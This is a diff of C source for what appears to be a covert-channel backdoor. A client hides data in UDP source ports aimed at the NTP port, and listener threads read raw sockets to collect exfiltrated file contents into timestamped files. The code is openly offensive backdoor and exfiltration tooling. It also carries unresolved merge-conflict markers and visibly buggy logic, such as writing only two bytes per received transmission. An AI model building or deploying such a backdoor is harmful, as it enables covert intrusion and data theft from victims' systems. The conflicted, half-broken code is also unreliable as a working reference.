@@ -74,10 +74,17 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 //			sendto(sock, enc, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
 
 //			free(enc);
+<<<<<<< HEAD
 
+			src_port = (frame[0] << 8) + frame[i];
+=======
+//			sendto(sock, frame, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
 			src_port = (SIGNTR << 8) + frame[i];
+>>>>>>> c8ebbc07c90368f8543d4d9782b936434a2589eb
 			dst_port = PORT_NTP;
 
+//			printf("Src: %d\n", src_port);
+			
 			_sendUDP(ipaddr, src_port, dst_port);
 			
 			usleep(SLEEP_TIME);
@@ -98,14 +105,18 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 
 void *listen_thread(void *arg)
 {
+	struct sockaddr_in saddr = *(struct sockaddr_in*)arg;
 	int sock;
 	char buf[MAX_LEN];
 	int buf_len = 0;
-	uint32 ipaddr = *(uint32*)arg;
 
 	sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
 	if(sock < 0)
 		error("unable to open listening raw socket");
+	
+	saddr.sin_addr.s_addr = LOCALHOST; // TODO: Use an actual address instead of localhost
+	if (bind(sock, (struct sockaddr*)&saddr, sizeof(saddr)) < 0)
+		error("Unable to bind result port.\n");
 
 	while(!closing)
 	{
@@ -115,23 +126,17 @@ void *listen_thread(void *arg)
 		char *dec;
 		char type;
 		int  pack_len;
-		uint32 *ip;
 
 		pack_len = read(sock, &packet, MAX_LEN);
 
 		// Step 1: locate the payload portion of the packet
-//		if (pack_len - IP_UDP_LEN <= 0)
-//			continue;
-
-		// Step 1: check IP address
-		ip = ((uint32*)packet) + 3;
-		if (*ip != ipaddr)
+		if (pack_len - IP_UDP_LEN <= 0)
 			continue;
+		ptr = (char *)(packet + IP_UDP_LEN);
 
 		// Step 2: check for signature
 
 		// Step 3: dump data into buffer
-		ptr = (char *)(packet + IP_UDP_LEN);
 //		dec = decrypt(SEKRET, ptr, FRAM_SZ);
 		data = buf + buf_len;
 		memcpy(data, ptr, FRAM_SZ);
@@ -170,69 +175,39 @@ void* exfil_listen(void *arg)
 {
 	int sock;
 	char buf[MAX_LEN];
-	int buf_len = 0;
-	uint32 ipaddr = *(uint32*)arg;
+	uint64 timestamp;
+	char fname[MAX_LEN];
+	FILE* file;
+//	uint32 src_addr = *(uint32*)arg;
 
 	sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
 	if(sock < 0)
 		error("unable to open exfil raw socket");
 
+	timestamp = get_sec();
+	sprintf(fname, "%llX", timestamp);
+	file = open_file(fname, TRUE);
+
 	while (TRUE)
 	{
-		char packet[MAX_LEN];
-		char *ptr;
 		char *data;
-		char *dec;
 		char type;
-		int  pack_len;
-		uint32 *ip;
+		int len;
 
-		pack_len = read(sock, &packet, MAX_LEN);
+		len = read(sock, &buf, MAX_LEN);
 
-		// Step 1: locate the payload portion of the packet
-//		if (pack_len - IP_UDP_LEN <= 0)
-//			continue;
-
-		// Step 1: check IP address
-		ip = ((uint32*)packet) + 3;
-		if (*ip != ipaddr)
-			continue;
-
-		// Step 2: check for signature
-
-		// Step 3: dump data into buffer
-		ptr = (char *)(packet + IP_UDP_LEN);
-//		dec = decrypt(SEKRET, ptr, FRAM_SZ);
-		data = buf + buf_len;
-		memcpy(data, ptr, FRAM_SZ);
-//		free(dec);
-
-		buf_len += pack_len - IP_UDP_LEN;
-
-		// Step 4: see if we have a full transmission
-		data = getTransmission(buf, &buf_len, &type);
-		if (data == NULL)
-			continue;
+		data = getTransmission(buf, &len, &type);
 
 		if (type == XFL_TYP)
 		{
-			char fname[MAX_LEN];
-			FILE* file;
-			uint64 timestamp;
-
-			timestamp = get_sec();
-			sprintf(fname, "%llX", timestamp);
-			file = open_file(fname, TRUE);
-
 			printf("%s", data);
-			fwrite(data, buf_len, 1, file);
-
-			fclose(file);
+			fwrite(data, 2, 1, file);
 		}
 
 		free(data);
 	}
 
+	fclose(file);
 	close(sock);
 
 	return NULL;
